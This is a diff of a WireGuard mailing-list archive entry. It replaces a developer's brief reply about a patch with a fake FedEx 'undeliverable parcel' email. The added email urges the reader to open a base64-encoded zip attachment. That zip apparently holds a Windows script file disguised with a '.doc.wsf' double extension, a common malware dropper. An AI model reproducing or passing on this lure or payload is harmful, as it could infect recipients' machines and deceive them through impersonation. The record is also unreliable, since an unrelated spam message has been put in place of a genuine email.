@@ -1,31 +1,25 @@
-Return-Path: Jason@zx2c4.com
+Return-Path: vs09052@vs09052.priorweb.be
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id f2521db1
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 3a3b2491
  for <wireguard@lists.zx2c4.com>;
- Fri, 23 Dec 2016 21:13:49 +0000 (UTC)
-Received: from frisell.zx2c4.com (frisell.zx2c4.com [192.95.5.64])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 738d57e0
+ Fri, 23 Dec 2016 23:02:28 +0000 (UTC)
+Received: from vs09052.priorweb.be (197-62.182.62.static.priorweb.net
+ [62.182.62.197])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id ee29c592
  for <wireguard@lists.zx2c4.com>;
- Fri, 23 Dec 2016 21:13:49 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 7260bda8
- for <wireguard@lists.zx2c4.com>;
- Fri, 23 Dec 2016 21:13:49 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTPSA id af964b32
- (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128:NO)
- for <wireguard@lists.zx2c4.com>;
- Fri, 23 Dec 2016 21:13:49 +0000 (UTC)
-Received: by mail-oi0-f50.google.com with SMTP id 128so85393381oig.0
- for <wireguard@lists.zx2c4.com>; Fri, 23 Dec 2016 13:21:18 -0800 (PST)
+ Fri, 23 Dec 2016 23:02:28 +0000 (UTC)
+Received: from vs09052 (Authenticated user: vs09052)
+ by vs09052.priorweb.be with local (Exim 4.72)
+ (envelope-from <vs09052@vs09052.priorweb.be>) id 1cKYyK-0004bl-1C
+ for wireguard@lists.zx2c4.com; Sat, 24 Dec 2016 00:09:56 +0100
+To: wireguard@lists.zx2c4.com
+Subject: FedEx issue #00446197: unable to delivery parcel
+Date: Sat, 24 Dec 2016 00:09:56 +0100
 MIME-Version: 1.0
-In-Reply-To: <20161223192555.34239-1-tomek@pipebreaker.pl>
-References: <20161223192555.34239-1-tomek@pipebreaker.pl>
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Fri, 23 Dec 2016 22:21:17 +0100
-Message-ID: <CAHmME9pq25q3NJ6q7v-tNN=kOD9sqfauzoY+JBZJN+-sOtoHrA@mail.gmail.com>
-Subject: Re: [PATCH] rename 'bandwidth' to 'transfer' in output
-To: Tomasz Torcz <tomek@pipebreaker.pl>
-Content-Type: text/plain; charset=UTF-8
-Cc: WireGuard mailing list <wireguard@lists.zx2c4.com>
+Message-ID: <63705b31930808687cff51bc38cee90d@old.5to9.be>
+From: "FedEx Priority Delivery" <julian.maddox@old.5to9.be>
+Content-Type: multipart/mixed; boundary="b1_06ecb6ff30b7167891f6ee124f8afd56"
+Reply-To: FedEx Priority Delivery <julian.maddox@old.5to9.be>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -35,12 +29,93 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-Hey Thomasz,
+--b1_06ecb6ff30b7167891f6ee124f8afd56
+Content-Type: text/plain; charset=us-ascii
 
-https://en.wikipedia.org/wiki/Bandwidth_(computing)#Bandwidth_in_web_hosting
+Dear Customer,
 
-That's funny; I guess I'm an idiot just like the web hosts.
+We can not deliver your parcel arrived at December 20.
 
-I'll merge this.
+You can find more details in this e-mail attachment!
 
-Jason
+Thank you for your assistance in this matter,
+Julian Maddox,
+Senior Operation Agent.
+
+
+--b1_06ecb6ff30b7167891f6ee124f8afd56
+Content-Type: application/zip; name="Delivery-Receipt-00446197.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Delivery-Receipt-00446197.zip
+
+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
+AIcAAABZDgAAAAA=
+
+
+--b1_06ecb6ff30b7167891f6ee124f8afd56--
